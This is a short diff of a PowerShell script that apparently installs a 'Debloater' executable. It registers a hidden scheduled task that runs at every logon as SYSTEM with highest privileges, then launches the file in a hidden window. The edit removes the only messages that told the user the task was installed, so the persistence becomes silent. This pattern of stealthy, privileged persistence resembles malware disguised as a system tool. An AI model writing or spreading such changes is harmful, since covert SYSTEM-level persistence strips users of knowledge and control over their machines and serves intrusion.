@@ -41,9 +41,7 @@ if (Test-Path $output1) {
         $trigger = New-ScheduledTaskTrigger -AtLogOn
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden Debloater Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
-        Write-Host "Debloater.exe added as a hidden scheduled task." -ForegroundColor Green
     } else {
-        Write-Host "Scheduled task already exists. No action taken." -ForegroundColor Yellow
     }
 
     Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
